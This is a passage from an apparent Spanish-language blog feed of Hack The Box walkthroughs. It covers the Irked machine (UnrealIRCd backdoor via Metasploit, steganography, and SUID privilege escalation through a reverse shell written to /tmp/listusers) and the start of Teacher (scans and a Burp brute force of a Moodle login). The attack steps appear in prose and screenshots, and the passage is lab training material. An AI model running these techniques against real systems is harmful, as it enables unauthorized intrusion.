OS:SCAN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.70%E&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4/26%OT&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;22%CT&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1%CU&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;31533%PV&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DS&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;2%DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;T%G&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%TM&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5CC2690
OS:F%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;SEQ&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;SP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;100%GCD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1%ISR&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10D%TI&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Z%CI&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;I%II&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;I%TS&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;OPS
OS:&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;O1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DST11NW7%O2&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DST11NW7%O3&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNT11NW7%O4&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DST11NW7%O5&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DST1
OS:1NW7%O6&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DST11&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;WIN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;W1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7120%W2&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7120%W3&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7120%W4&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7120%W5&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7120%W6&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7120&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;ECN
OS:&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7210%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW7%CC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;O%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S+%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A
OS:S%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T2&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;T3&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;T4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Z%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;R%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;R
OS:&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Z%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S+%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AR%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T6&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Z%F
OS:&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;R%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T7&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Z%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S+%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AR%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;U1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N%
OS:T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%IPL&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;164%UN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%RIPL&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RID&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RIPCK&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RUCK&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RUD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;IE&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DFI&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%CD
OS:&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

Network Distance: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; hops
Service Info: Host: irked.htb&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;using port 113/tcp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
HOP RTT      ADDRESS
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   83.76 ms 10.10.14.1
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   83.73 ms 10.10.10.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 2041.57 seconds.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;La pagina inicial nos muestra una imagen y una frase acerca de IRC.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/irked/Screenshot%20from%202019-04-25%2020.23.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Escaneo de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster -u 10.10.10.117 -w /usr/share/wordlists/dirb/common.txt -q -np -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/manual &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell---unrealircd&#34;&gt;SHELL - UnrealIRCd&lt;/h2&gt;
&lt;p&gt;Para UnrealIRCd existe un backdoor el cual se puede explotar mediante un exploit existente en metasploit quiza el mensaje de la pagina principal se referia a esta vulnerabilidad, vamos configuramos el exploit.&lt;/p&gt;
&lt;h3 id=&#34;exploit&#34;&gt;Exploit&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/irked/Screenshot%20from%202019-04-25%2020.34.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/irked/Screenshot%20from%202019-04-25%2020.35.31.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;payload&#34;&gt;Payload&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/irked/Screenshot%20from%202019-04-25%2020.37.33.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una Shell con el exploit&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/irked/Screenshot%20from%202019-04-25%2020.40.18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el directorio principal carpeta Documents encontramos un archivo llamado &lt;code&gt;.backup&lt;/code&gt; con un mensaje y una frase, el mensaje habla acerca de &lt;code&gt;steg&lt;/code&gt; que se puede referir a steganography pero no encontramos ninguna imagen en los directorios, en la pagina principal se encuentra una imagen vamos a utilizarla para extraer informacion que pueda esconder dentro.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/irked/Screenshot%20from%202019-04-25%2020.42.30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;stego---irked&#34;&gt;Stego - IRKED&lt;/h2&gt;
&lt;p&gt;Utilizamos steghide para extraer la informacion dentro de la imagen con la frase y encontramos una contraseña.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/irked/Screenshot%20from%202019-04-25%2020.57.27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;shell---djmardov&#34;&gt;SHELL - Djmardov&lt;/h2&gt;
&lt;p&gt;Utilizamos la contraseña que encontramos en la imagen en ssh, obtenemos nuestra bandera &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/irked/Screenshot%20from%202019-04-25%2021.07.47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Buscamos archivos SUID para escalar privilegios&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/irked/Screenshot%20from%202019-04-25%2021.10.40.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos un archivo &lt;code&gt;/usr/bin/viewuser&lt;/code&gt; que al ejecutarlo nos envia un error donde &lt;code&gt;/tmp/listusers&lt;/code&gt; no existe.&lt;/p&gt;
&lt;p&gt;Para obtener una shell root agregamos una shell inversa al archivo que no existe, damos permisos al archivo y lo ejecutamos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/irked/Screenshot%20from%202019-04-25%2021.24.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Obtenemos nuestra shell root y nuestra bandera &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/irked/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/irked/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Teacher</title>
        <link>https://sckull.github.io/posts/teacher/</link>
        <pubDate>Sat, 20 Apr 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 20 Apr 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/teacher/</guid>
        <description>Teacher es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Teacher es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos TCP&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap 7.70 scan initiated Thu Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 22:50:41 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; as: nmap -sT -A -sV -o nmap.scan 10.10.10.153
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.153
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.31s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;999&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.25 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Blackhat highschool
Device type: WAP
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4.20
OS details: Tomato 1.28 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Linux 2.4.20&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Network Distance: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; hops

TRACEROUTE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;using proto 1/icmp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
HOP RTT       ADDRESS
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   296.09 ms 10.10.12.1
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   300.57 ms 10.10.10.153

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Apr 18 22:52:41 2019 -- 1 IP address (1 host up) scanned in 120.38 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;gobuste&#34;&gt;GOBUSTE&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster -u http://10.10.10.153 -w /usr/share/wordlists/dirb/common.txt -q -np -x php,html,txt,js -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/fonts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/gallery.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/javascript &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/manual &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/moodle &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/phpmyadmin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Pagina Principal&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2015.55.21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;moodle&#34;&gt;/Moodle&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.07.05.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;login&#34;&gt;Login&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.12.29.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;phpmyadmin&#34;&gt;/phpmyadmin&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.07.54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;galleryhtml&#34;&gt;/gallery.html&lt;/h3&gt;
&lt;p&gt;En gallery.html encontramos codigo javascript que imprime un mensaje.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.02.47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.03.31.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Junto al codigo hay una imagen, pero no podemos verla.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.04.33.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Descargamos la imagen con curl y nos muestra un mensaje que contiene la imagen.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.09.45.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos dice que debemos de encontrar el caracter faltante para la contraseña &lt;code&gt;Th4C00lTheacha&lt;/code&gt; del usuario &lt;code&gt;Giovanni&lt;/code&gt;.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;burpsuite---giovanni-password&#34;&gt;BURPSUITE - Giovanni Password&lt;/h2&gt;
&lt;p&gt;Vamos a utilizar burpsuite para encontrar el caracter faltante de la contraseña, utilizando el login de moodle. Para los caracteres utilizamos &lt;code&gt;/usr/share/wordlists/dirb/stress/alphanum_case_extra.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Encontramos que el caracter faltante para la contraseña es &lt;code&gt;#&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.22.14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;moodle-1&#34;&gt;Moodle&lt;/h3&gt;
